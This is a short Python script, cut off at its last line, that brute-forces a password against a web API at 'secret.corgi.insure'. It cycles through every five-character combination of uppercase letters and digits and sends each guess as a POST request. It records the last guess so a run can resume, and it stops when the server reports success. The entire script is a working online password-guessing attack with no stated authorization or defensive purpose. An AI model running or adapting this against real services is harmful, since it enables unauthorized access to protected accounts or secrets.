import requests
import string
import os
from itertools import product

# API URL
url = "https://secret.corgi.insure/api/verify-password"

# Characters to try: uppercase A-Z and digits 0-9
characters = string.ascii_uppercase + string.digits

# File to store the last tried password
last_password_file = "last_password.txt"

def get_last_password():
    """Load the last tried password from the file, if it exists."""
    if os.path.exists(last_password_file):
        with open(last_password_file, "r") as file:
            return file.read().strip()
    return None

def save_last_password(password):
    """Save the last tried password to the file."""
    with open(last_password_file, "w") as file:
        file.write(password)

def brute_force_password():
    # Get the last tried password, if any
    last_password = get_last_password()
    start_found = False if last_password else True

    # Generate all combinations of 5 characters
    for combo in product(characters, repeat=5):
        password = ''.join(combo)

        # Skip until we find the last tried password
        if not start_found:
            if password == last_password:
                start_found = True
            continue

        payload = {"password": password}
        print(f"Trying password: {password}")

        try:
            # Make a POST request
            response = requests.post(url, json=payload, timeout=5)
            if response.status_code == 200 and response.json().get("success", False):
                print(f"Password found: {password}")
                return
        except requests.RequestException as e:
            print(f"Request failed: {e}")
        
        # Save the last tried password
        save_last_password(password)

    print("Password not found.")

# Run the script
if __name__ == "__main__":
    try:
        brute_force_password()
    except Keyboard
